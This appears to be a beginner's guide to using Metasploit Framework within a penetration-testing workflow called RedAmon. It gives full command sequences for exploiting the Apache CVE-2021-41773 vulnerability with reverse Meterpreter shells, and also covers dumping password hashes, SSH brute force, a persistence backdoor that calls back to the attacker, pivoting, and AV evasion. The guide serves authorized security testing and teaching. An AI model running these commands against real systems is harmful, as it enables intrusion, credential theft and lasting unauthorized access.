# Metasploit Framework - Complete Beginner's Guide

This guide covers everything you need to know about using Metasploit Framework through the terminal. It's written for beginners who want to understand exploitation testing as part of the RedAmon security assessment workflow.

## Table of Contents

1. [What is Metasploit?](#what-is-metasploit)
2. [When to Use Metasploit (in RedAmon Workflow)](#when-to-use-metasploit-in-redamon-workflow)
3. [Getting Started](#getting-started)
4. [Understanding Modules](#understanding-modules)
5. [Metasploit Operations Reference](#metasploit-operations-reference)
   - [Searching for Modules](#searching-for-modules)
   - [Getting Module Information](#getting-module-information)
   - [Working with Payloads](#working-with-payloads)
   - [Running Exploits](#running-exploits)
   - [Managing Sessions](#managing-sessions)
   - [Session Interaction](#session-interaction)
6. [Terminal Commands Reference](#terminal-commands-reference)
7. [Common Workflows](#common-workflows)
8. [Post-Exploitation](#post-exploitation)
9. [Safety and Legal Considerations](#safety-and-legal-considerations)

---

## What is Metasploit?

Metasploit Framework is the world's most widely used penetration testing tool. Think of it as a "Swiss Army knife" for security testing - it contains thousands of ready-to-use exploits, payloads, and auxiliary tools.

### Key Concepts

| Term | Simple Explanation |
|------|-------------------|
| **Exploit** | Code that takes advantage of a vulnerability to gain access to a system |
| **Payload** | Code that runs on the target after successful exploitation (like opening a shell) |
| **Auxiliary** | Helper tools for scanning, fingerprinting, or fuzzing (not exploitation) |
| **Post** | Tools to use after you already have access (post-exploitation) |
| **Session** | An active connection to a compromised system |
| **Meterpreter** | An advanced payload that gives you a powerful interactive shell |
| **RHOSTS** | Remote hosts - the target IP address(es) |
| **LHOST** | Local host - your attacking machine's IP |
| **RPORT** | Remote port - the port on the target |
| **LPORT** | Local port - the port on your machine for reverse connections |

---

## When to Use Metasploit (in RedAmon Workflow)

In the RedAmon security assessment pipeline, Metasploit comes **AFTER** reconnaissance:

```
RECON PHASE (what you've already done):
WHOIS -> DNS -> Port Scan (Naabu) -> HTTP Probe -> Web Crawling -> Vulnerability Scan (Nuclei)
                                                                       |
                                                              Vulnerabilities Found!
                                                                       |
                                                                       v
EXPLOITATION PHASE (Metasploit):
Search Module -> Get Info -> Select Payload -> Configure -> Exploit -> Post-Exploitation
```

**Use Metasploit when:**
- Nuclei or GVM found a vulnerability with a CVE number
- You need to verify if a vulnerability is actually exploitable
- You need to demonstrate impact (proof of concept)
- You're doing authorized penetration testing

**Don't use Metasploit for:**
- Initial reconnaissance (use the recon tools instead)
- Port scanning (use Naabu - it's faster)
- Vulnerability scanning (use Nuclei - it's better for web)

---

## Getting Started

### Starting Metasploit Console

```bash
# Interactive mode (recommended for learning)
msfconsole

# Quiet mode (suppress banner)
msfconsole -q

# Execute a command and exit
msfconsole -q -x "search apache; exit"
```

### In Docker (RedAmon Setup)

```bash
# Enter interactive Metasploit console
docker exec -it redamon-kali msfconsole

# Run a single command
docker exec redamon-kali msfconsole -q -x "search type:exploit apache; exit"
```

### Basic Navigation

Once inside `msfconsole`:

```
msf6 > help                    # Show all commands
msf6 > search apache           # Search for modules
msf6 > use exploit/multi/http/apache_normalize_path  # Select a module
msf6 exploit(apache_normalize_path) > show options   # See what you need to configure
msf6 exploit(apache_normalize_path) > set RHOSTS www.devergolabs.com  # Set target
msf6 exploit(apache_normalize_path) > set LHOST eth0  # Set your IP (use interface name for auto-detect)
msf6 exploit(apache_normalize_path) > exploit        # Run the exploit
```

---

## Understanding Modules

Metasploit organizes everything into modules. There are 5 types:

### 1. Exploits (`exploit/`)

These are the actual attack code. They exploit vulnerabilities to gain access.

**Structure:** `exploit/<platform>/<service>/<name>`

Examples:
- `exploit/windows/smb/ms17_010_eternalblue` - Famous Windows SMB exploit
- `exploit/linux/http/apache_normalize_path_rce` - Apache path traversal RCE
- `exploit/multi/http/struts2_content_type_ognl` - Apache Struts RCE

### 2. Auxiliary (`auxiliary/`)

Helper tools that don't directly exploit - they scan, fingerprint, or brute force.

**Structure:** `auxiliary/<category>/<name>`

Examples:
- `auxiliary/scanner/http/http_version` - Get HTTP server version
- `auxiliary/scanner/portscan/tcp` - TCP port scanner
- `auxiliary/scanner/ssh/ssh_login` - SSH brute force

### 3. Payloads (`payload/`)

Code that runs after successful exploitation. Three sub-types:

| Type | Description |
|------|-------------|
| **Singles** | Self-contained, small payloads (like `exec` to run a command) |
| **Stagers** | Small code that downloads the larger stage |
| **Stages** | The actual payload downloaded by the stager (like Meterpreter) |

Examples:
- `linux/x64/shell_reverse_tcp` - Simple reverse shell
- `linux/x64/meterpreter/reverse_tcp` - Meterpreter (staged)
- `windows/x64/meterpreter/reverse_https` - Encrypted Meterpreter

### 4. Post (`post/`)

Tools for after you have a session. Gather info, escalate privileges, pivot.

Examples:
- `post/multi/gather/hashdump` - Dump password hashes
- `post/linux/gather/enum_system` - Enumerate Linux system
- `post/windows/gather/credentials/credential_collector` - Collect Windows creds

### 5. Encoders (`encoder/`)

Obfuscate payloads to avoid detection.

Examples:
- `encoder/x86/shikata_ga_nai` - Polymorphic encoder
- `encoder/x64/xor` - Simple XOR encoding

---

## Metasploit Operations Reference

This section covers the core operations available in Metasploit Framework.

### Searching for Modules

**Purpose:** Find modules in the Metasploit database.

Metasploit contains 4,000+ modules. Use search to find exploits, auxiliaries, or payloads matching your query.

#### Search Syntax

**Basic keyword search:**
```
apache struts          # Find anything with "apache" AND "struts"
wordpress              # Find anything related to WordPress
CVE-2021-41773         # Search by CVE number
ms17-010               # Search by MS bulletin number
```

**Filter by type:**
```
type:exploit apache         # Only exploits for Apache
type:auxiliary scanner      # Only auxiliary scanners
type:post linux            # Only post-exploitation for Linux
type:payload meterpreter   # Only Meterpreter payloads
```

**Filter by platform:**
```
platform:windows smb       # Windows SMB modules
platform:linux http        # Linux HTTP modules
platform:multi apache      # Cross-platform Apache modules
```

**Filter by rank (reliability):**
```
rank:excellent            # Only excellent-rated exploits
rank:great               # Great-rated exploits
rank:good                # Good-rated exploits
```

Ranks from best to worst: `excellent` > `great` > `good` > `normal` > `average` > `low` > `manual`

**Combined filters:**
```
type:exploit platform:linux rank:excellent http
```

#### Examples

```bash
# Find exploits for a CVE found by Nuclei
search CVE-2021-41773

# Find HTTP scanners
search type:auxiliary scanner http

# Find WordPress exploits
search type:exploit wordpress

# Find excellent-ranked Windows exploits
search type:exploit platform:windows rank:excellent
```

#### Understanding the Output

```
Matching Modules
================

   #  Name                                          Disclosure Date  Rank       Check  Description
   -  ----                                          ---------------  ----       -----  -----------
   0  exploit/multi/http/apache_normalize_path_rce  2021-10-07       excellent  Yes    Apache 2.4.49/2.4.50 Path Traversal RCE
   1  auxiliary/scanner/http/apache_normalize_path  2021-10-07       normal     No     Apache 2.4.49/2.4.50 Path Traversal
```

| Column | Meaning |
|--------|---------|
| # | Index number |
| Name | Full module path (use this with the `info` command) |
| Disclosure Date | When the vulnerability was publicly disclosed |
| Rank | Reliability rating |
| Check | Whether the module can check without exploiting (safe test) |
| Description | What the module does |

---

### Getting Module Information

**Purpose:** Get detailed information about a specific module.

Use the `info` command to see everything about a module: what it exploits, what options you need to set, what targets it supports, references, and authors.

#### Examples

```bash
# Get info on Apache path traversal exploit
info exploit/multi/http/apache_normalize_path_rce

# Get info on EternalBlue
info exploit/windows/smb/ms17_010_eternalblue

# Get info on an auxiliary scanner
info auxiliary/scanner/http/http_version

# Or first select the module, then use info
use exploit/multi/http/apache_normalize_path_rce
info
```

#### Understanding the Output

```
       Name: Apache 2.4.49/2.4.50 Path Traversal RCE
     Module: exploit/multi/http/apache_normalize_path_rce
   Platform: Unix, Linux
       Arch: cmd, x86, x64
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2021-10-07

Available targets:
  Id  Name
  --  ----
  0   Automatic (Dropper)
  1   Unix Command (In-Memory)

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  Proxies                     no        A proxy chain
  RHOSTS                      yes       The target host(s)
  RPORT      443              yes       The target port (TCP)
  SSL        true             no        Use SSL
  TARGETURI  /cgi-bin         yes       Path to target URI

Description:
  This module exploits a path traversal and file disclosure
  vulnerability in Apache HTTP Server 2.4.49 and 2.4.50...

References:
  https://nvd.nist.gov/vuln/detail/CVE-2021-41773
  https://nvd.nist.gov/vuln/detail/CVE-2021-42013
```

**Key sections explained:**

| Section | What it tells you |
|---------|-------------------|
| Platform | What OS the target must be running |
| Arch | What CPU architectures are supported |
| Privileged | Whether you get root/admin access |
| Rank | How reliable the exploit is |
| Available targets | Different exploitation methods |
| Basic options | **IMPORTANT** - what you need to configure |
| Required=yes | You MUST set this option |
| Description | What the vulnerability is and how exploitation works |
| References | Links to CVE details, original research |

---

### Working with Payloads

**Purpose:** List all payloads compatible with an exploit.

Use `show payloads` to see which payloads work with a specific exploit module. Different exploits support different payload types based on target OS and architecture.

#### Examples

```bash
# First select an exploit module
use exploit/multi/http/apache_normalize_path_rce

# Then see what payloads work with it
show payloads

# For Windows exploits
use exploit/windows/smb/ms17_010_eternalblue
show payloads
```

#### Understanding the Output

```
Compatible Payloads
===================

   #  Name                                     Disclosure Date  Rank    Check  Description
   -  ----                                     ---------------  ----    -----  -----------
   0  payload/cmd/unix/reverse_bash                             normal  No     Unix Command Shell, Reverse TCP (/dev/tcp)
   1  payload/cmd/unix/reverse_netcat                           normal  No     Unix Command Shell, Reverse TCP (via netcat)
   2  payload/linux/x64/meterpreter/reverse_tcp                 normal  No     Linux Meterpreter, Reverse TCP Stager
   3  payload/linux/x64/shell/reverse_tcp                       normal  No     Linux Command Shell, Reverse TCP Stager
```

**Choosing the right payload:**

| Payload Type | When to Use |
|--------------|-------------|
| `cmd/unix/*` | Simple, works on most Unix systems |
| `linux/x64/shell/*` | Need a basic shell on 64-bit Linux |
| `linux/x64/meterpreter/*` | Need advanced features (file download, pivoting) |
| `windows/x64/meterpreter/*` | Windows target, need advanced features |
| `*_reverse_tcp` | Target can connect back to you (most common) |
| `*_bind_tcp` | You connect to target (use when target can't reach you) |
| `*_reverse_https` | Encrypted connection, harder to detect |

#### Payload Information

**Purpose:** Get detailed information about a specific payload.

Use the `info` command on a payload to see its description, required options (LHOST, LPORT), platform compatibility, and architecture requirements.

#### Examples

```bash
# Get info on Linux Meterpreter
info payload/linux/x64/meterpreter/reverse_tcp

# Get info on Windows reverse shell
info payload/windows/x64/shell_reverse_tcp

# Get info on simple bash reverse shell
info payload/cmd/unix/reverse_bash

# Or set the payload first, then use info
set PAYLOAD linux/x64/meterpreter/reverse_tcp
info
```

#### Understanding the Output

```
       Name: Linux Meterpreter, Reverse TCP Stager
     Module: payload/linux/x64/meterpreter/reverse_tcp
   Platform: Linux
       Arch: x64
   Needs Admin: No
 Total size: 130

Basic options:
  Name   Current Setting  Required  Description
  ----   ---------------  --------  -----------
  LHOST                   yes       The listen address (your IP)
  LPORT  4444             yes       The listen port

Description:
  Spawn a Meterpreter shell and connect back to the attacker.
  Uses a staged approach - small stager downloads full Meterpreter.
```

**Key options explained:**

| Option | What it means |
|--------|---------------|
| LHOST | **Your** IP address - where the target connects back to |
| LPORT | Port on your machine that listens for the connection |
| Platform | Target must be running this OS |
| Arch | Target must have this CPU architecture |
| Staged vs Stageless | Staged = smaller, downloads full payload. Stageless = larger, self-contained |

---

### Running Exploits

**Purpose:** Execute an exploit with a payload against a target.

Configure the module options and launch the exploitation attempt. If successful, it creates a session (shell access) to the target.

#### Required Configuration

| Option | Description |
|--------|-------------|
| `RHOSTS` | Target IP address or hostname |
| `RPORT` | Target port number |
| `PAYLOAD` | Payload to deliver |
| `LHOST` | Your IP address (for reverse connection) |
| `LPORT` | Your listening port |

#### Examples

```bash
# Basic exploitation workflow
use exploit/multi/http/apache_normalize_path_rce
set RHOSTS 10.0.0.5
set RPORT 443
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.10
set LPORT 4444
exploit

# With extra options
use exploit/multi/http/apache_normalize_path_rce
set RHOSTS 10.0.0.5
set RPORT 8080
set PAYLOAD cmd/unix/reverse_bash
set LHOST 10.0.0.10
set LPORT 4444
set SSL false
set TARGETURI /cgi-bin
exploit
```

#### Understanding the Output

**Successful exploitation:**
```
[*] Started reverse TCP handler on 10.0.0.10:4444
[*] 10.0.0.5:443 - Attempting to exploit...
[*] 10.0.0.5:443 - Sending payload...
[*] Sending stage (3012548 bytes) to 10.0.0.5
[*] Meterpreter session 1 opened (10.0.0.10:4444 -> 10.0.0.5:49832)

Active sessions
===============

  Id  Type                   Information          Connection
  --  ----                   -----------          ----------
  1   meterpreter x64/linux  www-data @ target    10.0.0.10:4444 -> 10.0.0.5:49832
```

**Failed exploitation:**
```
[*] Started reverse TCP handler on 10.0.0.10:4444
[*] 10.0.0.5:443 - Attempting to exploit...
[-] 10.0.0.5:443 - Exploit failed: The target is not vulnerable
[*] Exploit completed, but no session was created.
```

**Common failure reasons:**

| Message | Meaning |
|---------|---------|
| "Target is not vulnerable" | The target was patched or different version |
| "Connection refused" | Target port is closed or firewalled |
| "No session created" | Payload didn't execute (firewall, AV, wrong payload) |
| "Handler failed to bind" | Your LPORT is already in use |

---

### Managing Sessions

**Purpose:** List all active sessions (compromised systems).

Use the `sessions` command to see all current connections to compromised targets, including session type, user context, and connection details.

#### Examples

```bash
# List all active sessions
sessions

# List with details
sessions -l

# Interact with a specific session
sessions -i 1

# Kill a specific session
sessions -k 1

# Kill all sessions
sessions -K
```

#### Understanding the Output

```
Active sessions
===============

  Id  Name  Type                   Information               Connection
  --  ----  ----                   -----------               ----------
  1         meterpreter x64/linux  www-data @ webserver      10.0.0.10:4444 -> 10.0.0.5:49832 (10.0.0.5)
  2         shell linux            command shell             10.0.0.10:4445 -> 10.0.0.6:52341 (10.0.0.6)
```

| Column | Meaning |
|--------|---------|
| Id | Session number - use this with `sessions -i <id>` |
| Type | `meterpreter` (advanced) or `shell` (basic) |
| Information | Username @ hostname |
| Connection | Your_IP:port -> Target_IP:port |

---

### Session Interaction

**Purpose:** Execute commands on a compromised system.

Use `sessions -i <id>` to interact with an active session. Different commands work depending on whether it's a shell or meterpreter session.

#### How to Interact

```bash
# Enter an interactive session
sessions -i 1

# You're now inside the session
# Use 'background' to return to msfconsole
# Use Ctrl+Z as alternative to background

# From within meterpreter, run shell commands
meterpreter > shell
# Or execute directly
meterpreter > execute -f cmd.exe -i -H
```

#### Shell Session Commands

For basic shell sessions (type: `shell`), use standard Linux/Windows commands:

```bash
# Linux shell commands
whoami              # Current user
id                  # User ID and groups
uname -a            # System info
cat /etc/passwd     # User accounts
cat /etc/shadow     # Password hashes (needs root)
netstat -tlnp       # Network connections
ps aux              # Running processes
ls -la /home        # List home directories
cat /etc/crontab    # Scheduled tasks
find / -perm -4000 2>/dev/null  # SUID binaries

# Windows shell commands
whoami /all                        # Current user with privileges
systeminfo                         # System information
net user                           # User accounts
net localgroup administrators      # Admin users
ipconfig /all                      # Network configuration
tasklist                           # Running processes
netstat -ano                       # Network connections
```

#### Meterpreter Commands

For meterpreter sessions (type: `meterpreter`), use meterpreter-specific commands:

```bash
# System information
sysinfo          # Detailed system info
getuid           # Current user
getpid           # Current process ID
ps               # Process list

# File operations
pwd              # Current directory
ls               # List files
cat /etc/passwd  # Read file
download /etc/passwd /opt/output/  # Download file
upload /opt/tools/linpeas.sh /tmp/ # Upload file

# Privilege escalation
getsystem        # Attempt to get SYSTEM (Windows)
hashdump         # Dump password hashes

# Network
ipconfig         # Network interfaces
route            # Routing table
arp              # ARP table
portfwd add -l 8080 -p 80 -r 192.168.1.100  # Port forward

# Shell access
shell            # Drop to system shell
execute -f cmd.exe -i -H  # Execute hidden command
```

#### Example Session Output

```
meterpreter > sysinfo

Computer        : webserver
OS              : Ubuntu 20.04 (Linux 5.4.0-42-generic)
Architecture    : x64
Meterpreter     : x64/linux
```

---

## Terminal Commands Reference

When using `msfconsole` directly (not through MCP), these are the essential commands:

### Global Commands

| Command | Description | Example |
|---------|-------------|---------|
| `help` | Show all commands | `help` |
| `search` | Find modules | `search apache` |
| `use` | Select a module | `use exploit/multi/http/apache_normalize_path_rce` |
| `back` | Deselect current module | `back` |
| `info` | Show module details | `info` |
| `exit` | Exit msfconsole | `exit` |

### Module Commands (after `use`)

| Command | Description | Example |
|---------|-------------|---------|
| `show options` | Show configurable options | `show options` |
| `show targets` | Show available targets | `show targets` |
| `show payloads` | Show compatible payloads | `show payloads` |
| `set` | Set an option | `set RHOSTS 10.0.0.5` |
| `setg` | Set option globally (persists) | `setg LHOST 10.0.0.10` |
| `unset` | Clear an option | `unset RHOSTS` |
| `check` | Check if target is vulnerable (safe) | `check` |
| `exploit` or `run` | Execute the module | `exploit` |
| `exploit -j` | Run as background job | `exploit -j` |

### Session Commands

| Command | Description | Example |
|---------|-------------|---------|
| `sessions` | List active sessions | `sessions` |
| `sessions -l` | List with details | `sessions -l` |
| `sessions -i 1` | Interact with session 1 | `sessions -i 1` |
| `sessions -k 1` | Kill session 1 | `sessions -k 1` |
| `sessions -K` | Kill all sessions | `sessions -K` |
| `background` | Background current session | `background` |

### Job Commands

| Command | Description | Example |
|---------|-------------|---------|
| `jobs` | List running jobs | `jobs` |
| `jobs -K` | Kill all jobs | `jobs -K` |
| `jobs -k 1` | Kill job 1 | `jobs -k 1` |

### Database Commands

| Command | Description | Example |
|---------|-------------|---------|
| `db_status` | Check database connection | `db_status` |
| `hosts` | List discovered hosts | `hosts` |
| `services` | List discovered services | `services` |
| `vulns` | List found vulnerabilities | `vulns` |
| `creds` | List gathered credentials | `creds` |
| `loot` | List gathered loot | `loot` |

---

## Common Workflows

### Workflow 1: From CVE to Exploitation

You found CVE-2021-41773 during Nuclei scan. Here's how to exploit it:

```bash
# 1. Search for the CVE
msfconsole -q -x "search CVE-2021-41773; exit"

# 2. Get module info
msfconsole -q -x "info exploit/multi/http/apache_normalize_path_rce; exit"

# 3. Check compatible payloads
msfconsole -q -x "use exploit/multi/http/apache_normalize_path_rce; show payloads; exit"

# 4. Exploit
msfconsole -q -x "
use exploit/multi/http/apache_normalize_path_rce
set RHOSTS 10.0.0.5
set RPORT 443
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.10
set LPORT 4444
exploit
"
```

### Workflow 2: Check Before Exploit (Safe Mode)

Some modules can check if vulnerable without actually exploiting:

```bash
msfconsole -q -x "
use exploit/multi/http/apache_normalize_path_rce
set RHOSTS 10.0.0.5
set RPORT 443
check
exit
"
```

Output:
```
[+] 10.0.0.5:443 - The target is vulnerable.
```
or
```
[-] 10.0.0.5:443 - The target is not vulnerable.
```

### Workflow 3: Using Auxiliary Scanners

When you don't have a specific CVE but want to identify service versions:

```bash
# HTTP version scanner
msfconsole -q -x "
use auxiliary/scanner/http/http_version
set RHOSTS 10.0.0.5
set RPORT 80
run
exit
"

# FTP scanner
msfconsole -q -x "
use auxiliary/scanner/ftp/ftp_version
set RHOSTS 10.0.0.5
run
exit
"

# SMB scanner
msfconsole -q -x "
use auxiliary/scanner/smb/smb_version
set RHOSTS 10.0.0.5
run
exit
"
```

### Workflow 4: Brute Force (with caution!)

```bash
# SSH brute force
msfconsole -q -x "
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 10.0.0.5
set USERNAME admin
set PASS_FILE /usr/share/wordlists/rockyou.txt
set THREADS 5
set STOP_ON_SUCCESS true
run
exit
"
```

**Warning:** Brute forcing can lock accounts and trigger alerts!

---

## Post-Exploitation

After getting a session, here's what to do:

### Initial Enumeration

```bash
# In meterpreter session
sysinfo                    # System information
getuid                     # Current user
getprivs                   # Current privileges
```

### Privilege Escalation

```bash
# Try automatic privilege escalation (Windows)
getsystem

# Search for privesc opportunities
run post/multi/recon/local_exploit_suggester
```

### Gather Credentials

```bash
# Dump password hashes
hashdump                   # Linux/Windows
run post/linux/gather/hashdump
run post/windows/gather/hashdump

# Search for credentials in files
run post/multi/gather/credentials/credential_collector
```

### Persistence (maintain access)

```bash
# Create persistent backdoor
run persistence -U -i 60 -p 4444 -r 10.0.0.10
```

### Pivoting (attack internal networks)

```bash
# Add route through compromised host
run autoroute -s 192.168.1.0/24

# Set up SOCKS proxy
use auxiliary/server/socks_proxy
set SRVPORT 1080
run -j

# Then use proxychains on attacker machine:
# proxychains nmap 192.168.1.100
```

---

## Safety and Legal Considerations

### ALWAYS Remember

1. **Get Written Authorization** - Never test systems without explicit permission
2. **Define Scope** - Know exactly what systems you're allowed to test
3. **Document Everything** - Keep logs of all actions
4. **Know Your Exit** - Have a plan to clean up after testing
5. **Don't Cause Damage** - Avoid DoS, data destruction, or production impact

### In RedAmon Context

- Use `--dry-run` options when available
- Prefer `check` before `exploit`
- Test on isolated/staging systems first
- Use the Neo4j graph to track what you've tested

### Clean Up After Testing

```bash
# List all sessions
sessions -l

# Kill all sessions
sessions -K

# Check for leftover jobs
jobs -l

# Kill all jobs
jobs -K

# Exit cleanly
exit
```

---

## Quick Reference Card

### Most Used Commands

```bash
# Search
search <keyword>
search type:exploit <keyword>
search CVE-XXXX-XXXXX

# Select module
use <module_path>

# Configure
set RHOSTS <target_ip>
set RPORT <target_port>
set PAYLOAD <payload_path>
set LHOST <your_ip>
set LPORT <your_port>

# Execute
check          # Safe check
exploit        # Run exploit
exploit -j     # Run in background

# Sessions
sessions -l    # List
sessions -i 1  # Interact
sessions -k 1  # Kill
```

### Common Payloads

| Target | Payload |
|--------|---------|
| Linux (simple) | `cmd/unix/reverse_bash` |
| Linux (advanced) | `linux/x64/meterpreter/reverse_tcp` |
| Windows (simple) | `windows/x64/shell_reverse_tcp` |
| Windows (advanced) | `windows/x64/meterpreter/reverse_tcp` |
| Java apps | `java/meterpreter/reverse_tcp` |
| PHP apps | `php/meterpreter/reverse_tcp` |

### Common Ports for LPORT

| Port | Notes |
|------|-------|
| 4444 | Default (may be blocked) |
| 443 | Looks like HTTPS (recommended) |
| 80 | Looks like HTTP |
| 8080 | Alternative HTTP |
| 53 | Looks like DNS |

---

## Troubleshooting

### "No session was created"

1. **Check firewall** - Can target reach your LHOST:LPORT?
2. **Try different payload** - `cmd/unix/reverse_bash` is simpler than meterpreter
3. **Try different LPORT** - Use 443 or 80 (often allowed through firewalls)
4. **Verify target is vulnerable** - Use `check` command first

### "Connection refused"

1. **Verify target port is open** - Use Naabu or nmap first
2. **Check if service is running** - The service might have crashed
3. **Try different RPORT** - Maybe it's on a non-standard port

### "Handler failed to bind"

1. **Port already in use** - Choose a different LPORT
2. **Need root** - Ports below 1024 require root privileges
3. **Firewall blocking** - Check your local firewall

### Meterpreter dies immediately

1. **AV/EDR killed it** - Try `shikata_ga_nai` encoder
2. **Wrong architecture** - Match payload to target (x86 vs x64)
3. **Try stageless payload** - `shell_reverse_tcp` instead of `shell/reverse_tcp`

---

This guide covers the fundamentals of Metasploit for the RedAmon exploitation workflow. Remember: with great power comes great responsibility. Always test ethically and legally!
